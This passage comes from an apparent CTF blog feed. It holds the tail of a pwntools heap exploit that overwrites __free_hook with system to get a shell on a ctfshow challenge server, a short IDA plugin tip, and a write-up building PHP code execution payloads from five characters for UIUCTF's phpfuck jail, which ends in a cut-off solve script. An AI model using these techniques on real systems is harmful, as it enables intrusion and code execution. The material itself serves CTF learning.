class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/21 01:25:02</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./Moon_note.note'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28079</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(title,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title of note to write content:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line">    p.recvuntil(<span class="string">'Size of content'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title of note to show content:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice: Title of note to delete:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    add_note(str(i))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line">add_note(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_note(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvline()[<span class="number">1</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x48</span>,p64(addr<span class="number">-0x20</span>)+p64(addr<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">    add(i+<span class="number">6</span>,<span class="number">0x48</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add_note(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">molloc_hook_addr=u64(p.recvline()[<span class="number">1</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span><span class="number">-0x10</span></span><br><span class="line">log.info(hex(molloc_hook_addr))</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,molloc_hook_addr)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add_note(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">22</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">23</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;久违参加了ctfshow的比赛，题都比较简单，就是远程环境libc我泄露半天才泄露出来… (⊙﹏⊙)</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</title>
    <link href="lexsd6.github.io/2021/09/16/&#39;could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!&#39;%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/"/>
    <id>lexsd6.github.io/2021/09/16/&#39;could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!&#39;%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/</id>
    <published>2021-09-16T03:39:36.860Z</published>
    <updated>2021-09-16T05:43:36.860Z</updated>
    
    <content type="html"><![CDATA[<p>额,之前一直被<code>could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!</code>这个报错恶心了很久,今天无意间终于找到了解决(补救方案)。<a id="more"></a></p><h2 id="报错状况描述"><a href="#报错状况描述" class="headerlink" title="报错状况描述"></a>报错状况描述</h2><p>在报错后，出现 <code>.plt.sec</code> 的segement。libc的symbols能被ida正常解析，但是并未被ida自动连接绑定上。本该解析libc symbols的地方，显示的是<code>.plt.sec</code>的值， 如图：</p><p><img src="image-20210916112022149.png" alt="image-20210916112022149"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>添加插件：pltresolver</p><p>项目地址：<a href="https://github.com/veritas501/pltresolver" target="_blank" rel="noopener">https://github.com/veritas501/pltresolver</a></p><p>在ida项目中的<code>plugins</code>倒入脚本：</p><p><img src="image-20210916113633798.png" alt="image-20210916113633798"></p><p>打开ida看到<code>pltResolver plugin has been loaded.Press Ctrl+Shift+J to resolve .plt.sec symbols.</code>即为倒入成功！</p><p><img src="image-20210916113730185.png" alt="image-20210916113730185"></p><h2 id="修复后效果"><a href="#修复后效果" class="headerlink" title="修复后效果"></a>修复后效果</h2><p>看到ida 把libc sysmbols用重新识别上了： </p><p><img src="image-20210916113420325.png" alt="image-20210916113420325"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;额,之前一直被&lt;code&gt;could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!&lt;/code&gt;这个报错恶心了很久,今天无意间终于找到了解决(补救方案)。</summary>
    
    
    
    <category term="tools" scheme="lexsd6.github.io/categories/tools/"/>
    
    
    <category term="ida" scheme="lexsd6.github.io/tags/ida/"/>
    
    <category term="problem_resolve" scheme="lexsd6.github.io/tags/problem-resolve/"/>
    
  </entry>
  
  <entry>
    <title>5种字符&#39;(^.9)&#39;构造php_shellcode</title>
    <link href="lexsd6.github.io/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/"/>
    <id>lexsd6.github.io/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/</id>
    <published>2021-09-03T01:50:00.222Z</published>
    <updated>2021-09-15T06:57:37.259Z</updated>
    
    <content type="html"><![CDATA[<p>2021_uiuctf中出了一道jali题PHPfuck,题目要求用5种字符构造出php shellcode,感觉很有意思便记录下来。<a id="more"></a></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>这道题给的很洁净，就是下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Flag is inside ./flag.php :)</span></span><br><span class="line">($x=str_replace(<span class="string">"`"</span>,<span class="string">""</span>,strval($_REQUEST[<span class="string">"x"</span>])))&amp;&amp;strlen(count_chars($x,<span class="number">3</span>))&lt;=<span class="number">5</span>?<span class="keyword">print</span>(<span class="keyword">eval</span>(<span class="string">"return $x;"</span>)):show_source(<span class="keyword">__FILE__</span>)&amp;&amp;phpinfo();</span><br></pre></td></tr></table></figure><p>（当然在比赛结束后，官方也分享了环境<a href="https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）" target="_blank" rel="noopener">https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）</a></p><p>题目通过了<code>strlen(count_chars($x,3))&lt;=5</code>限制我们最多用5个字符。</p><p>这五个字符，一度困扰了我很久，因为我一开始想到的是<code>(^.&#39;)</code>。。。。。。</p><h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="双标的"><a href="#双标的" class="headerlink" title="双标的."></a>双标的<code>.</code></h3><p>在php中，<code>.</code>号又对于两个字符串间有连接的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'le'</span>.<span class="string">'xsd6'</span>) <span class="comment">#string(6) "lexsd6"</span></span><br></pre></td></tr></table></figure><p>对两个数字间的<code>.</code>号，php会将他们看作是小数关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(1.2) #float(1.2)</span><br></pre></td></tr></table></figure><p>但，如把<code>.</code>号附近的数字用括号括起来php会把他们进行字符串般的对待</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump((<span class="number">1</span>));<span class="comment">#int(1)</span></span><br><span class="line">var_dump((<span class="number">2</span>));<span class="comment">#int(2)</span></span><br><span class="line">var_dump((<span class="number">1</span>).(<span class="number">2</span>));<span class="comment">#string(2) "12"</span></span><br></pre></td></tr></table></figure><p>同时由于php对于大于309长度的数字转化为<code>INF</code>,<code>INF</code>与<code>(9)</code>同连接符号<code>.</code>得到string  <code>&quot;INF9&quot;</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>);</span><br><span class="line"><span class="comment"># float(INF)</span></span><br><span class="line">var_dump((<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>).(<span class="number">9</span>));</span><br><span class="line"><span class="comment"># string(4) "INF9"</span></span><br></pre></td></tr></table></figure><h3 id="奇怪的"><a href="#奇怪的" class="headerlink" title="奇怪的^"></a>奇怪的<code>^</code></h3><p>由于php变量的特性。在进行<code>^</code>操作时，其结果也有些微妙变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'9'</span>^(<span class="number">1</span>)); <span class="comment">#int(8)</span></span><br><span class="line">var_dump(<span class="string">'9'</span>^<span class="string">'1'</span>);<span class="comment">#string(1) ""</span></span><br><span class="line">var_dump(<span class="string">'9'</span>^<span class="number">1</span>)<span class="comment">#;int(8)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">var_dump(<span class="string">'99'</span>^(<span class="number">1</span>));<span class="comment">#int(98)</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="string">'1'</span>);<span class="comment">#string(1) ""</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="number">1</span>);<span class="comment">#int(98)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'99'</span>^(<span class="number">11</span>));<span class="comment">#int(104)</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="string">'11'</span>);<span class="comment">#string(2) ""</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="number">11</span>);<span class="comment">#int(104)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'c'</span>^<span class="number">11</span>);<span class="comment">#int(11)</span></span><br><span class="line">var_dump(<span class="string">'c'</span>^<span class="string">'11'</span>);<span class="comment">#string(1) "R"</span></span><br><span class="line">var_dump(<span class="string">'c'</span>^(<span class="number">11</span>));<span class="comment">#int(11)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'cc'</span>^<span class="number">11</span>);<span class="comment">#int(11)</span></span><br><span class="line">var_dump(<span class="string">'cc'</span>^<span class="string">'11'</span>);<span class="comment">#string(2) "RR"</span></span><br><span class="line">var_dump(<span class="string">'cc'</span>^(<span class="number">11</span>));<span class="comment">#int(11)</span></span><br></pre></td></tr></table></figure><p>可以上看到几点：</p><ol><li>数字字符串（string型数字，如上：’99’.’9’）在与int数字进行<code>^</code>操作时，会把两者都视为int数字来进行操作。所以<code>&#39;9&#39;^(1)</code>实际上是<code>9^1</code>而不是<code>&#39;\x39&#39;^1</code>.</li><li>两不同字符串相<code>^</code>时，结果字符串长度跟原字符串两者中最小字符串长度的字符相等。(例:<code>&#39;c&#39;^&#39;11&#39; == &quot;R&quot;</code>)</li><li>字符字符串与int数字相与时，结果为原来int数字</li></ol><h3 id="小数四舍五入"><a href="#小数四舍五入" class="headerlink" title="小数四舍五入"></a>小数四舍五入</h3><p>在php中会把<code>.99</code>自动看成是小数<code>0.99</code>。</p><p>同当一个浮点数的小数位大于<code>.99999999999999999995</code>时，会自动变成进一位。小于会丢弃最后一位：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">.999999999999994</span>);<span class="comment">#float(0.99999999999999)</span></span><br><span class="line">var_dump(<span class="number">.999999999999995</span>);<span class="comment">#float(1)</span></span><br><span class="line">var_dump(<span class="number">.999999999999999</span>);<span class="comment">#float(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="number">3.99999999999994</span>);<span class="comment">#float(3.9999999999999)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999995</span>);<span class="comment">#float(3.9999999999999)</span></span><br><span class="line">var_dump(<span class="number">3.999999999999955</span>);<span class="comment">#float(4)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999996</span>);<span class="comment">#float(4)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999999</span>);<span class="comment">#float(4)</span></span><br></pre></td></tr></table></figure><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><h3 id="构造任意数字"><a href="#构造任意数字" class="headerlink" title="构造任意数字"></a>构造任意数字</h3><p>由于上面的特性,我们可以用<code>9(^).</code>这个字符简单的构造些数字如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'106'</span>:<span class="string">'(99^9)'</span>,</span><br><span class="line"><span class="string">'99'</span>:<span class="string">'(99)'</span>,</span><br><span class="line"><span class="string">'19'</span>:<span class="string">'(((.99999999999999999999).(9))^(9)^(9))'</span>,</span><br><span class="line"><span class="string">'7'</span>:<span class="string">'(99.999999999999999999^99)'</span>,</span><br><span class="line"><span class="string">'3'</span>:<span class="string">'(9.9999999999999999999^9)'</span>,</span><br><span class="line"><span class="string">'1'</span>:<span class="string">'(.99999999999999999999)'</span>,</span><br><span class="line"><span class="string">'0'</span>:<span class="string">'(9^9)'</span>,</span><br><span class="line"><span class="string">'9'</span>:<span class="string">'(9)'</span>,</span><br></pre></td></tr></table></figure><p>我们再让这些数字相互<code>^</code>进而得到所有的单字符数字(<code>0-9</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#39;1&#39;: &#39;(.99999999999999999999)&#39;, </span><br><span class="line">&#39;0&#39;: &#39;(9^9)&#39;, </span><br><span class="line">3&#39;: &#39;(9.9999999999999999999^9)&#39;, </span><br><span class="line">&#39;2&#39;: &#39;((9.9999999999999999999^9)^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;5&#39;:&#39;(((99.999999999999999999^99)^(9.9999999999999999999^9))^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;4&#39;: &#39;((99.999999999999999999^99)^(9.9999999999999999999^9))&#39;,</span><br><span class="line">&#39;7&#39;: &#39;(99.999999999999999999^99)&#39;,</span><br><span class="line">&#39;6&#39;: &#39;((99.999999999999999999^99)^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;9&#39;: &#39;(9)&#39;, </span><br><span class="line">&#39;8&#39;: &#39;((9)^(.99999999999999999999))&#39;&#125;</span><br></pre></td></tr></table></figure><h3 id="通过可变函数构造任意字符"><a href="#通过可变函数构造任意字符" class="headerlink" title="通过可变函数构造任意字符"></a>通过可变函数构造任意字符</h3><h4 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h4><p>在php高版本中我们可以通过字符串+<code>(变量)</code>的方式来调用函数.例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'phpinfo'</span>)()<span class="comment">#phpinfo()</span></span><br><span class="line">(<span class="string">'syStem'</span>)(<span class="string">'ls'</span>)<span class="comment">#system('ls')</span></span><br></pre></td></tr></table></figure><p>同时，由于php函数名是不区分大小的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr() ==CHr()</span><br><span class="line"><span class="string">'cHr'</span>()=chr()</span><br></pre></td></tr></table></figure><p>我们只要构造出<code>C/c</code>、<code>H/h</code>、<code>R/r</code>就可以调用<code>chr</code>从而构造任意字符。</p><h4 id="构造chr"><a href="#构造chr" class="headerlink" title="构造chr"></a>构造chr</h4><p>我们可以通过<code>&#39;INF9&#39;</code>,构造出不分大小写的<code>chr</code>.</p><p>经过test后发现:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;I&#39;^&#39;3&#39;^&#39;9&#39; &#x3D;&#x3D;&#39;C&#39;</span><br><span class="line">&#39;N&#39;^&#39;1&#39;^&#39;7&#39;&#x3D;&#39;H&#39;</span><br><span class="line">&#39;F&#39;^&#39;4&#39; &#x3D;&#x3D;&#39;r&#39;</span><br></pre></td></tr></table></figure><p>于是我们可以让：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(‘INF‘.(<span class="number">9</span>))^(<span class="string">'314'</span>)^(<span class="string">'97\X00X00'</span>)==<span class="string">'CHr'</span>;</span><br><span class="line"><span class="comment">#即</span></span><br><span class="line"><span class="string">'CHr'</span>==((((<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>).(<span class="number">9</span>))^((<span class="number">9.9999999999999999999</span>^<span class="number">9</span>).(<span class="number">.99999999999999999999</span>).((<span class="number">99.999999999999999999</span>^<span class="number">99</span>)^(<span class="number">9.9999999999999999999</span>^<span class="number">9</span>))))^((<span class="number">9</span>).(<span class="number">99.999999999999999999</span>^<span class="number">99</span>).(((<span class="number">9</span>).(<span class="number">9</span>))^((<span class="number">9</span>).(<span class="number">9</span>)))));</span><br></pre></td></tr></table></figure><h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">def init():</span><br><span class="line">    num=&#123;</span><br><span class="line">        <span class="string">'106'</span>:<span class="string">'(99^9)'</span>,</span><br><span class="line">        <span class="string">'99'</span>:<span class="string">'(99)'</span>,</span><br><span class="line">        <span class="string">'19'</span>:<span class="string">'(((.99999999999999999999).(9))^(9)^(9))'</span>,</span><br><span class="line">        <span class="string">'7'</span>:<span class="string">'(99.999999999999999999^99)'</span>,</span><br><span class="line">        <span class="string">'3'</span>:<span class="string">'(9.9999999999999999999^9)'</span>,</span><br><span class="line">        <span class="string">'1'</span>:<span class="string">'(.99999999999999999999)'</span>,</span><br><span class="line">        <span class="string">'0'</span>:<span class="string">'(9^9)'</span>,</span><br><span class="line">        <span class="string">'9'</span>:<span class="string">'(9)'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> y in range(<span class="number">3</span>):</span><br><span class="line">        key=num.keys()</span><br><span class="line">        <span class="keyword">for</span> i in range(len(key)):</span><br><span class="line">            <span class="keyword">for</span> x  in range(len(key)):</span><br><span class="line">                k=(int(key[x])^int(key[i]))</span><br><span class="line">                <span class="keyword">if</span> num.has_key(str(k))== <span class="keyword">False</span>:</span><br><span class="line">                    num[str(k)]=<span class="string">'('</span>+num[key[x]]+<span class="string">'^'</span>+num[key[i]]+<span class="string">')'</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">def one_num(num):</span><br><span class="line">    onum=&#123;&#125;</span><br><span class="line">    key=num.keys()</span><br><span class="line">    <span class="keyword">for</span> i in range(len(key)):</span><br><span class="line">        <span class="keyword">if</span> len(key[i])==<span class="number">1</span>:</span><br><span class="line">            onum[(key[i])]=num[key[i]]</span><br><span class="line">    <span class="keyword">return</span> onum</span><br><span class="line">def get_null(long=<span class="number">1</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">null</span>=<span class="string">'11'</span></span><br><span class="line"></span><br><span class="line">def chrstr(I,N,F):</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    I=I.split(<span class="string">'^'</span>)</span><br><span class="line">    N=N.split(<span class="string">'^'</span>)</span><br><span class="line">    F=F.split(<span class="string">'^'</span>)</span><br><span class="line">    MAX_num=max(len(I),len(N),len(F))</span><br><span class="line">    num=int_num</span><br><span class="line">    num[<span class="string">'null'</span>]=<span class="string">'(((9).(9))^((9).(9)))'</span></span><br><span class="line">    ret=<span class="string">'((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))'</span></span><br><span class="line">    <span class="comment">#print(I,N,F)</span></span><br><span class="line">    <span class="keyword">if</span> len(F)&lt;MAX_num:</span><br><span class="line">        </span><br><span class="line">            F.append(<span class="string">'null'</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(MAX_num):</span><br><span class="line">        ret=<span class="string">'('</span>+ret+<span class="string">"^("</span>+int_num[I[i]]+<span class="string">"."</span>+int_num[N[i]]+<span class="string">"."</span>+int_num[F[i]]+<span class="string">"))"</span></span><br><span class="line">    <span 